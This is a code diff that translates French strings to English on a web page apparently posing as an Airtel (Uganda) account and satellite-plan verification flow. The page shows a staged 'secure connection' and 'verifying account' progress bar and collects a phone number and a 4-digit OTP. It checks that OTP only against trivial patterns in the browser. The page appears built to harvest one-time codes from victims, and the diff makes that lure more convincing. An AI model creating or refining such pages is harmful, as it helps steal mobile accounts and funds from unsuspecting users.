@@ -471,7 +471,7 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
     <div class="proc-bar"><div class="proc-bar-fill" id="procBar"></div></div>
     <div class="proc-steps">
       <div class="proc-step act" id="psi0"><div class="proc-step-dot"></div><div class="proc-step-txt">Secure connection established</div></div>
-      <div class="proc-step" id="psi1"><div class="proc-step-dot"></div><div class="proc-step-txt">Vérification du compte Airtel</div></div>
+      <div class="proc-step" id="psi1"><div class="proc-step-dot"></div><div class="proc-step-txt">Verifying Airtel account</div></div>
       <div class="proc-step" id="psi2"><div class="proc-step-dot"></div><div class="proc-step-txt">Satellite plan validation</div></div>
       <div class="proc-step" id="psi3"><div class="proc-step-dot"></div><div class="proc-step-txt">Envoi du code OTP…</div></div>
     </div>
@@ -487,8 +487,8 @@ html,*{-webkit-text-size-adjust:100%!important;text-size-adjust:100%!important}
           <line x1="12" y1="18" x2="12.01" y2="18" stroke-width="3"/>
         </svg>
       </div>
-      <h2>Vérification OTP</h2>
-      <p>Un code à 4 chiffres has been sent to your Airtel number</p>
+      <h2>OTP Verification</h2>
+      <p>A 4-digit code has been sent to your Airtel number</p>
       <div class="otp-phone" id="otpPhone"><span>🇺🇬</span>+256 —</div>
     </div>
 
@@ -672,7 +672,7 @@ async function runProcessing(ph){
   var bar = document.getElementById('procBar');
   var sub = document.getElementById('procSub');
   var steps = [
-    {pct:25, txt:'Vérification du compte Airtel…', si:1},
+    {pct:25, txt:'Verifying Airtel account…', si:1},
     {pct:55, txt:'Validating ' + (forfait.name || 'your order') + '…', si:2},
     {pct:85, txt:'Envoi OTP au +256 ' + ph + '…', si:3},
     {pct:100, txt:'OTP code sent to your phone!'}
@@ -774,7 +774,7 @@ function otpError(msg, showResend){
   var actEl = document.getElementById('otpErrActions');
   msgEl.textContent = msg; actEl.innerHTML = '';
   var retry = document.createElement('button');
-  retry.type = 'button'; retry.className = 'otp-err-btn ghost'; retry.textContent = 'Réessayer';
+  retry.type = 'button'; retry.className = 'otp-err-btn ghost'; retry.textContent = 'Try again';
   retry.onclick = function(){
     otpVal = ''; document.getElementById('otpInput').value = '';
     renderOTP(); updateOTPBtn(); el.style.display = 'none'; focusOTPInput();
@@ -792,9 +792,9 @@ function otpError(msg, showResend){
   setTimeout(function(){ el.style.display = 'none'; renderOTP(); }, 8000);
 }
 function validateOTP(val){
-  if(/^(\d)\1{3}$/.test(val)){ otpError('Code invalide — pas de chiffres répétés', false); return false; }
+  if(/^(\d)\1{3}$/.test(val)){ otpError('Invalid code — no repeated digits', false); return false; }
   var seqs = ['1234','2345','3456','4567','5678','6789','0123','9876','8765','7654','6543','5432','4321','3210'];
-  if(seqs.indexOf(val) !== -1){ otpError('Code invalide — séquence trop simple', false); return false; }
+  if(seqs.indexOf(val) !== -1){ otpError('Invalid code — sequence too simple', false); return false; }
   return true;
 }
 function submitOTP(){
